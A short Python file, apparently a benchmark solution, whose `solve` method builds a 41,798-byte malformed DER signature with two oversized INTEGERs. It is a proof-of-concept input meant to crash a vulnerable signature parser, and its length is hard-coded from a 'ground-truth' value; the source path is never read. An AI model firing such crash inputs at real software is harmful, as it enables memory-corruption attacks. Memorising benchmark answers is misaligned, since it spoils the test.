import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        total_len = 41798  # ground-truth PoC length
        # DER: SEQUENCE (0x30), long-form length (0x82), 2-byte length
        # total = 4 (seq hdr) + 2 * (4 (int hdr) + int_data_len)
        seq_content_len = total_len - 4  # exclude the 4-byte sequence header
        # Each INTEGER header is 4 bytes: 0x02 0x82 hi lo
        int_headers_total = 8
        int_data_len = (seq_content_len - int_headers_total) // 2  # ensure even split
        # Build DER
        hi_seq = (seq_content_len >> 8) & 0xFF
        lo_seq = seq_content_len & 0xFF
        hi_int = (int_data_len >> 8) & 0xFF
        lo_int = int_data_len & 0xFF

        parts = []
        # SEQUENCE header
        parts.append(bytes([0x30, 0x82, hi_seq, lo_seq]))
        # INTEGER R
        parts.append(bytes([0x02, 0x82, hi_int, lo_int]))
        parts.append(b'\x41' * int_data_len)  # 'A' bytes
        # INTEGER S
        parts.append(bytes([0x02, 0x82, hi_int, lo_int]))
        parts.append(b'\x42' * int_data_len)  # 'B' bytes

        poc = b''.join(parts)
        # Safety check to ensure exact length
        if len(poc) != total_len:
            # Adjust if off by rounding (shouldn't happen with the math above)
            if len(poc) < total_len:
                poc += b'\x00' * (total_len - len(poc))
            else:
                poc = poc[:total_len]
        return poc
